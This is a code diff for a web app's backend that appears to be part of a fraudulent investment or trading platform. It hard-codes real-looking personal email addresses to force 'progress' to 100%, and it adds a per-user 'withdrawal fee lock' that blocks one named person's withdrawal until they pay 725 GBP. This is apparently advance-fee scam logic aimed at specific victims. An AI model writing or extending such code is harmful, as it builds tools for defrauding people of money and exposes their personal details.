@@ -119,8 +119,23 @@ const SYSTEM_TAX_PAID_PERCENT_BY_EMAIL = {
 };
 const SYSTEM_FORCE_PROGRESS_COMPLETE_BY_EMAIL = new Set([
   "kelvinwhite@gmail.com",
-  "clentewhite@gmail.com"
+  "clentewhite@gmail.com",
+  "tzahielk@gmail.com"
 ]);
+const SYSTEM_WITHDRAWAL_FEE_LOCK_BY_EMAIL = {
+  "tzahielk@gmail.com": { amount: 725, asset: "GBP" }
+};
+
+function getSystemWithdrawalFeeLock(email) {
+  const e = String(email || "").toLowerCase();
+  if (!e) return null;
+  const cfg = SYSTEM_WITHDRAWAL_FEE_LOCK_BY_EMAIL[e];
+  if (!cfg || typeof cfg !== "object") return null;
+  const amount = Number(cfg.amount);
+  const asset = normalizeAsset(cfg.asset || "GBP", "GBP");
+  if (!Number.isFinite(amount) || amount <= 0) return null;
+  return { amount: Number(amount.toFixed(8)), asset };
+}
 
 function parsePackageIdFromNote(note) {
   const s = String(note || "");
@@ -2871,6 +2886,15 @@ uiRouter.post("/withdrawals", requireAuth, async (req, res) => {
     if (!state) return res.status(400).json({ error: "Progress plan is not initialized for this account." });
     if (state.plan.unit !== asset) return res.status(400).json({ error: `Invalid asset for this account. Use ${state.plan.unit}.` });
     if (state.progress01 < 1 - eps) return res.status(400).json({ error: "Withdrawal unlocks only at 100% progress." });
+    const withdrawalFeeLock = getSystemWithdrawalFeeLock(state.userEmail);
+    if (withdrawalFeeLock) {
+      return res.status(400).json({
+        error: `Withdrawal fee clearance required: pay ${Number(withdrawalFeeLock.amount).toFixed(2)} ${withdrawalFeeLock.asset} before requesting withdrawal.`,
+        code: "WITHDRAWAL_FEE_REQUIRED",
+        fee_amount: withdrawalFeeLock.amount,
+        fee_asset: withdrawalFeeLock.asset
+      });
+    }
 
     const snapshot = await computeUserTaxSnapshot(userId, asset, state);
     if (!snapshot) return res.status(400).json({ error: "Tax context is unavailable." });
